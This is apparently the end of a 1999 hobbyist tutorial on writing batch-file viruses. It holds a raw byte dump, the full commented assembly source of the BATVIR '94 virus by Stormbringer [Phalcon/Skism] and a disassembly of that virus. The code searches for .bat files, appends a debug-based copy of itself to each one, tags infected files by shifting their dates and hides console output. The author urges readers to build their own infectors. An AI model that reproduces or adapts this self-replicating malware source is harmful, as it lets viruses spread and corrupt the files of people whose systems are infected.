		db  20h	;  
		db  0Ah	;  
		db  0Dh	;  
		db    0	;  
		db  2Dh	; -
		db  2Dh	; -
		db  2Dh	; -
		db  2Dh	; -
		db  2Dh	; -
		db  2Dh	; -
		db  2Dh	; -
		db  20h	;  
		db  45h	; E
		db  6Eh	; n
		db  44h	; D
		db  20h	;  
		db  4Fh	; O
		db  66h	; f
		db  20h	;  
		db  46h	; F
		db  69h	; i
		db  6Ch	; l
		db  45h	; E
		db  20h	;  
		db  2Dh	; -
		db  2Dh	; -
		db  2Dh	; -
		db  2Dh	; -
		db  2Dh	; -
		db  2Dh	; -
		db  2Dh	; -
		db  2Dh	; -
		db  2Dh	; -
		db  2Dh	; -
		db  2Dh	; -
		db  2Dh	; -
		db  2Dh	; -
		db  0Ah	;  
		db  0Dh	;  
		db    0	;  
		db  8Dh	; �
		db 0B6h	; �
		db  20h	;  
		db    0	;  
		db 0B8h	; +
		db  22h	; "
		db    1	;  
		db 0FFh	;  
		db 0D0h	; -
		db  8Dh	; �
		db 0B6h	; �
		db  34h	; 4
		db    0	;  
		db 0B8h	; +
		db  22h	; "
		db    1	;  
		db 0FFh	;  
		db 0D0h	; -
		db  8Dh	; �
		db 0B6h	; �
		db  71h	; q
		db    0	;  
		db 0BFh	; +
		db    0	;  
		db    0	;  
		db 0B8h	; +
		db  30h	; 0
		db    1	;  
		db 0FFh	;  
		db 0D0h	; -
		db  8Dh	; �
		db 0B6h	; �
		db  79h	; y
		db    0	;  
		db 0B8h	; +
		db  22h	; "
		db    1	;  
		db 0FFh	;  
		db 0D0h	; -
		db 0B8h	; +
		db  71h	; q
		db    1	;  
		db 0FFh	;  
		db 0D0h	; -
		db  8Dh	; �
		db 0B6h	; �
		db  8Bh	; �
		db    0	;  
		db 0BFh	; +
		db    1	;  
		db    0	;  
		db 0B8h	; +
		db  30h	; 0
		db    1	;  
		db 0FFh	;  
		db 0D0h	; -
		db  8Dh	; �
		db 0B6h	; �
		db  93h	; �
		db    0	;  
		db 0B8h	; +
		db  22h	; "
		db    1	;  
		db 0FFh	;  
		db 0D0h	; -
		db 0B8h	; +
		db  71h	; q
		db    1	;  
		db 0FFh	;  
		db 0D0h	; -
		db  8Dh	; �
		db 0B6h	; �
		db 0B6h	; �
		db    0	;  
		db 0BFh	; +
		db    1	;  
		db    0	;  
		db 0B8h	; +
		db  30h	; 0
		db    1	;  
		db 0FFh	;  
		db 0D0h	; -
		db  8Dh	; �
		db 0B6h	; �
		db 0BEh	; +
		db    0	;  
		db 0B8h	; +
		db  22h	; "
		db    1	;  
		db 0FFh	;  
		db 0D0h	; -
		db 0B8h	; +
		db  71h	; q
		db    1	;  
		db 0FFh	;  
		db 0D0h	; -
		db  8Dh	; �
		db 0B6h	; �
		db 0EAh	; O
		db    0	;  
		db 0BFh	; +
		db    1	;  
		db    0	;  
		db 0B8h	; +
		db  30h	; 0
		db    1	;  
		db 0FFh	;  
		db 0D0h	; -
		db  8Dh	; �
		db 0B6h	; �
		db 0F2h	; =
		db    0	;  
		db 0B8h	; +
		db  22h	; "
		db    1	;  
		db 0FFh	;  
		db 0D0h	; -
		db 0B8h	; +
		db  71h	; q
		db    1	;  
		db 0FFh	;  
		db 0D0h	; -
		db  8Dh	; �
		db 0B6h	; �
		db  0Ah	;  
		db    1	;  
		db 0B8h	; +
		db  90h	; �
		db    1	;  
		db 0FFh	;  
		db 0D0h	; -
		db  8Bh	; �
		db  86h	; �
		db  14h	;  
		db    1	;  
		db 0FFh	;  
		db 0E0h	; a
		db  8Dh	; �
		db 0B6h	; �
		db  1Bh	;  
		db    1	;  
		db 0BFh	; +
		db    0	;  
		db    0	;  
		db 0B8h	; +
		db  30h	; 0
		db    1	;  
		db 0FFh	;  
		db 0D0h	; -
		db  8Dh	; �
		db 0B6h	; �
		db  23h	; #
		db    1	;  
		db 0B8h	; +
		db  22h	; "
		db    1	;  
		db 0FFh	;  
		db 0D0h	; -
		db 0B8h	; +
		db  71h	; q
		db    1	;  
		db 0FFh	;  
		db 0D0h	; -
		db  8Dh	; �
		db 0B6h	; �
		db  35h	; 5
		db    1	;  
		db 0BFh	; +
		db    1	;  
		db    0	;  
		db 0B8h	; +
		db  30h	; 0
		db    1	;  
		db 0FFh	;  
		db 0D0h	; -
		db  8Dh	; �
		db 0B6h	; �
		db  3Dh	; =
		db    1	;  
		db 0B8h	; +
		db  22h	; "
		db    1	;  
		db 0FFh	;  
		db 0D0h	; -
		db 0B8h	; +
		db  71h	; q
		db    1	;  
		db 0FFh	;  
		db 0D0h	; -
		db  8Dh	; �
		db 0B6h	; �
		db  60h	; `
		db    1	;  
		db 0BFh	; +
		db    1	;  
		db    0	;  
		db 0B8h	; +
		db  30h	; 0
		db    1	;  
		db 0FFh	;  
		db 0D0h	; -
		db  8Dh	; �
		db 0B6h	; �
		db  68h	; h
		db    1	;  
		db 0B8h	; +
		db  22h	; "
		db    1	;  
		db 0FFh	;  
		db 0D0h	; -
		db 0B8h	; +
		db  71h	; q
		db    1	;  
		db 0FFh	;  
		db 0D0h	; -
		db  8Dh	; �
		db 0B6h	; �
		db  94h	; �
		db    1	;  
		db 0BFh	; +
		db    1	;  
		db    0	;  
		db 0B8h	; +
		db  30h	; 0
		db    1	;  
		db 0FFh	;  
		db 0D0h	; -
		db  8Dh	; �
		db 0B6h	; �
		db  9Ch	; �
		db    1	;  
		db 0B8h	; +
		db  22h	; "
		db    1	;  
		db 0FFh	;  
		db 0D0h	; -
		db 0B8h	; +
		db  71h	; q
		db    1	;  
		db 0FFh	;  
		db 0D0h	; -
		db  8Dh	; �
		db 0B6h	; �
		db 0B3h	; �
		db    1	;  
		db 0B8h	; +
		db  22h	; "
		db    1	;  
		db 0FFh	;  
		db 0D0h	; -
		db 0B8h	; +
		db    0	;  
		db  4Ch	; L
		db 0CDh	; -
		db  21h	; !
seg000		ends


		end start


THat's the code i hope that very usefull and understand what i mean.
Some of batch command can work in Win9x, that why i show you with simple
command (lame huh??). Learn more asm to make Batch Infector. Example of 
Batch Infector made by Stormbringer [P/S] and here is the real code.

;             [BATVIR] '94 (c) 1994 Stormbringer [Phalcon/Skism]
;
;   This virus is a bit cheesy, but hell.... Believe it or not, I got bored 
;enough to write a direct action .BAT infector in assembly.  It infects files 
;by basically creating a debug script of itself, echoing it out to a file,
;then running it using debug to infect more files.  I doubt anyone has
;done this in quite this manner, so....
;
;
;
;enjoy,
;Stormbringer [P/S]


.model tiny
.radix 16
.code
        org 100h
start:
        mov     ah,4eh               ;find service
        mov     dx,offset filemask   ; *.bat to infect

FindFile:        
        int     21h             ;execute it
        jc      NoMoreFiles     ;jump no more file if don't find any
                                ;thing's again :-))
        mov     dx,9eh          ;locating DTA
        mov     ax,3d02h        ;open file service
        int     21h             ;execute it
        jc      DoneInfect      ;jump done infect if enough file to infect
        xchg    bx,ax           ;change handle to bx

        mov     ax,5700h        ;get date
        int     21h
        push    cx dx           ;save cx and dx to stack for use later

        cmp     dh,80           ;   ????
        jae     AlreadyInfected ;


        mov     ax,4202h        ;go to end of file
        xor     cx,cx           ;zero cx
        xor     dx,dx           ;zero dx
        int     21h             ;do it ;))

        mov     si,100h         ;move 100h to si
        mov     di,offset end_virus ;destination end virus
        mov     cx,end_virus-start  ;length
        push    bx                  ;save bx
        call    Convert2Hex         
        pop     bx                  ;restore bx

        call    InfectBat           


        pop     dx
        add     dh,0c8h  ;Add 100 years to filedate
        push    dx

AlreadyInfected:
        pop     dx cx    ;restore dx and cx
        mov     ax,5701h ;restore date
        int     21h      ;do it!!

        mov     ah,3eh   ;close file
        int     21h      ;after finish infect it

DoneInfect:        
        mov     ah,4fh   ;find next file
        jmp     FindFile ;jump find file

NoMoreFiles:
        mov     ax,4c00h ;return
        int     21h      ;to host


Convert2Hex:
        push    cx
        lodsb
        mov     bx,ax
        mov     cx,4
        shr     al,cl        
        push    ax
        call    convert2asc
        stosb
        pop     ax
        shl     al,cl
        sub     bl,al
        xchg    al,bl
        call    convert2asc
        stosb
        mov     ax,' '
        stosb
        pop     cx
        loop    Convert2hex
        stosb
        stosb
        ret

convert2asc:
        cmp     al,0a
        jae     letter
        add     al,'0'
        ret
letter:
        add     al,'A'-0a
        ret

InfectBat:
        mov     ah,40h               ;write service   
        mov     dx,offset startinf   ;from startinf
        mov     cx,endsinf-startinf  ;Write start of infection till end
        int     21h                  ;Let's go
        mov     dx,offset end_virus  ;to end virus

   DataLoop:
        push    dx        
        call    calcloc
        call    writeecho1        
        pop     dx        
        push    dx

        mov     cx,di
        sub     cx,dx
        cmp     cx,60d
        jb      WriteData
        mov     cx,60d
WriteData:
        mov     ah,40h
        int     21h

        push    ax
        call    WriteRedirect
        pop     ax

        pop     dx        
        add     dx,ax
        cmp     dx,di
        jae     WriteGoExitCommands
        jmp     DataLoop


WriteGoExitCommands:
        call    writeecho2

        mov     ah,40h
        mov     dx,offset govirus
        mov     cx,1
        int     21h

        call    WriteRedirect
        call    writeecho2

        mov     ah,40h
        mov     dx,offset govirus+1
        mov     cx,1
        int     21h

        call    WriteRedirect

        mov     dx,offset batchender
        mov     cx,endbatend-batchender
        mov     ah,40h
        int     21h

        ret
        
WriteRedirect:
        mov     dx,offset echodest
        mov     cx,endvirusfile-echodest
        mov     ah,40h                   
        int     21h
        ret

WriteEcho1:
        mov     cx,enddb-databyte
        jmp     short WriteEcho
WriteEcho2:
        mov     cx,5
WriteEcho:
        mov     dx,offset databyte
        mov     ah,40h
        int     21h
        ret


calcloc:
        push    ax bx cx dx si di
        sub     dx,offset end_virus
        mov     ax,dx
        mov     cx,3
        xor     dx,dx
        div     cx
        mov     dx,ax
        add     dx,100
        mov     di,offset temp
        mov     si,offset location
        xchg    dh,dl
        mov     location,dx
        mov     cx,2
        call    Convert2Hex
        mov     di,offset buffer1
        mov     si,offset temp
        movsw
        lodsb
        movsw
        pop     di si dx cx bx ax
        ret

;------------ Data ----------------------;
Filemask        db      '*.bat',0   ; file we need

govirus         db      'gq'
endgovirus:

databyte        db      'echo e'
buffer1         db      '0100 '
enddb:

echodest        db      ' >>'  ;append in batch
VirusFile       db      'batvir.94',0dh,0ah
EndVirusFile:

Batchender      db      'debug<batvir.94',0dh,0ah ,'del batvir.94',0dh,0ah
                db      'ctty con',0dh,0ah
endbatend:

startinf:        
        db      0dh,0ah,'@echo off',0dh,0ah
        db      'ctty nul',0dh,0ah
Credits db      'rem [BATVIR] ''94 (c) Stormbringer [P/S]',0dh,0ah
endsinf:
location        dw      0
temp            dw      0,0,0,0

end_virus:          ;end of virus
end start

And here are code after i disassembly it. That Virii infect all batch 
or *.bat extention. and make it with debug in batch file and see the 
different so you can make it in other ways. U can't make just ren 
*.bat to *.com and if run it it error.

data_1e		equ	9Eh

	seg_a		segment	byte public
			assume	cs:seg_a, ds:seg_a


			org	100h

	batch		proc	far

	start:
			mov	ah,4Eh			; 'N'
			mov	dx,235h
	loc_1:						;  xref 3685:014C
  		int	21h
		jc	loc_4
		mov	dx,data_1e
		mov	ax,3D02h
			int	21h
		jc	loc_3
			xchg	bx,ax
			mov	ax,5700h
		int	21h
		push	cx
		push	dx
		cmp	dh,80h
		jae	loc_2
		mov	ax,4202h
		xor	cx,cx
		xor	dx,dx
		int	21h
		mov	si,100h
		mov	di,2CAh
		mov	cx,1CAh
		push	bx
		call	sub_1			; (0153)
		pop	bx
		call	sub_3			; (0180)
		pop	dx


		add	dh,0C8h
		push	dx
	loc_2:						;  xref 3685:011E
		pop	dx
		pop	cx
		mov	ax,5701h
		int	21h
		mov	ah,3Eh
		int	21h
loc_3:						;  xref 3685:0111
		mov	ah,4Fh			; 'O'
		jmp	short loc_1		; (0105)
loc_4:						;  xref 3685:0107
		mov	ax,4C00h
		int	21h

batch		endp

;&=&=&=&=&=&=&=&=&=&=&=&=&=&=&=&=&=&=&=&=&=&=&=&=&=&=&=&=&=&=&=&=&=&=&=
;                              SUBROUTINE
;
;         Called from:   3685:0133, 0222
;@=@=@=@=@=@=@=@=@=@=@=@=@=@=@=@=@=@=@=@=@=@=@=@=@=@=@=@=@=@=@=@=@=@=@=

sub_1		proc	near

	locloop_5:					;  xref 3685:0171
			push	cx
		lodsb
		mov	bx,ax
		mov	cx,4
		shr	al,cl
		push	ax
		call	sub_2			; (0176)
		stosb
		pop	ax
		shl	al,cl
		sub	bl,al
		xchg	al,bl
		call	sub_2			; (0176)
		stosb
		mov	ax,20h
		stosb
		pop	cx
		loop	locloop_5
		stosb
		stosb
		retn
sub_1		endp


;_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=
;                              SUBROUTINE
;
;         Called from:   3685:015D, 0168
;%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=



	sub_2		proc	near
			cmp	al,0Ah
		jae	loc_6
		add	al,30h			; '0'
		retn
loc_6:						;  xref 3685:0178
		add	al,37h			; '7'
		retn
	sub_2		endp


;_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=
;                              SUBROUTINE
;
;         Called from:   3685:0137
;#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=#=

	sub_3		proc	near
		mov	ah,40h			; '@'
		mov	dx,offset data_10
		mov	cx,40h
		int	21h
		mov	dx,2CAh
loc_7:						;  xref 3685:01B2
		push	dx
		call	sub_7			; (01FA)
		call	sub_5			; (01EA)
		pop	dx
		push	dx
		mov	cx,di
		sub	cx,dx
		cmp	cx,3Ch
		jb	loc_8
		mov	cx,3Ch
loc_8:						;  xref 3685:019D
		mov	ah,40h
		int	21h
		push	ax
		call	sub_4			; (01DF)
		pop	ax
		pop	dx
		add	dx,ax
		cmp	dx,di
		jae	loc_9
		jmp	short loc_7		; (018D)
loc_9:						;  xref 3685:01B0
		call	sub_6			; (01EF)
		mov	ah,40h			; '@'
		mov	dx,offset data_3+6
		mov	cx,1
		int	21h
		call	sub_4			; (01DF)
		call	sub_6			; (01EF)
		mov	ah,40h			; '@'
		mov	dx,offset data_5
		mov	cx,1


		int	21h
		call	sub_4			; (01DF)
		mov	dx,offset data_9
		mov	cx,2Ah
		mov	ah,40h
		int	21h
		retn
sub_3		endp


;=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=__=_=_=_=_=_=
;                              SUBROUTINE
;
;         Called from:   3685:01A7, 01C1, 01D1
;&=&=&=&=&=&=&=&=&=&=$=$=$=$=$=$=$=$=$=$=$=$=$=$=$=$=@=@=@=@=@=@=@=@=@=@=

	sub_4		proc	near
		mov	dx,offset data_8
		mov	cx,0Eh
		mov	ah,40h
		int	21h
		retn
	sub_4		endp


;$=$=$=$=$=$=$=$=$=$=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=%=%=%=%=%=
;                              SUBROUTINE
;
;         Called from:   3685:0191
;&=&=&=&=&=&=&=&=&=&=&=+=+=+=+=+=+=+=+=+=+=+=+=+=+=@=@=@=@=@=@=@=@=@=@=@=

	sub_5		proc	near
		mov	cx,0Bh
		jmp	short loc_10		; (01F2)

;____ External Entry into Subroutine ______________________________________
;
;         Called from:   3685:01B4, 01C4

sub_6:
		mov	cx,5
loc_10:						;  xref 3685:01ED
		mov	dx,offset data_6
		mov	ah,40h
		int	21h
		retn
sub_5		endp


;_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_
;                              SUBROUTINE
;
;         Called from:   3685:018E
;^~^~^~^~^~^~^~^~^~^~^~^~^^~^~^~^~^~^~^~^~^~^~^~^~^^~^~^~^~^~^~^~^~^~^~^~^

sub_7		proc	near
			push	ax


		push	bx
		push	cx
		push	dx
		push	si
		push	di
		sub	dx,2CAh
		mov	ax,dx
		mov	cx,3
		xor	dx,dx
		div	cx
		mov	dx,ax
		add	dx,100h
		mov	di,2C2h
		mov	si,offset data_11
		xchg	dh,dl
		mov	data_11,dx
		mov	cx,2
		call	sub_1			; (0153)
		mov	di,offset data_7
		mov	si,offset data_12
		movsw
		lodsb
        	movsw
		pop	di
		pop	si
        	pop	dx
		pop	cx
		pop	bx
		pop	ax
		retn
sub_7		endp

	data_3		db	'*.bat', 0
			db	'gqecho e0100  >>batvir.94', 0Dh, 0Ah
			db	'debug<batvir.94', 0Dh, 0Ah, 'del'
			db	' batvir.94', 0Dh, 0Ah, 'ctty con'
			db	0Dh, 0Ah, 0Dh, 0Ah, '@echo off', 0Dh
			db	0Ah, 'ctty nul', 0Dh, 0Ah, 'rem ['
			db	'BATVIR] ', 27h, '94 (c) Stormbri'
			db	'nger [P/S]', 0Dh, 0Ah
	data_11		dw	0			;  xref 3685:0216, 021B
	data_12		dw	4 dup (0)		;  xref 3685:0228

	seg_a		ends
			end	start

+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

Thank you for reading this little text about batch infector.

AsmHead, Mei (c)1999.

                         -=(E.N.D)=-






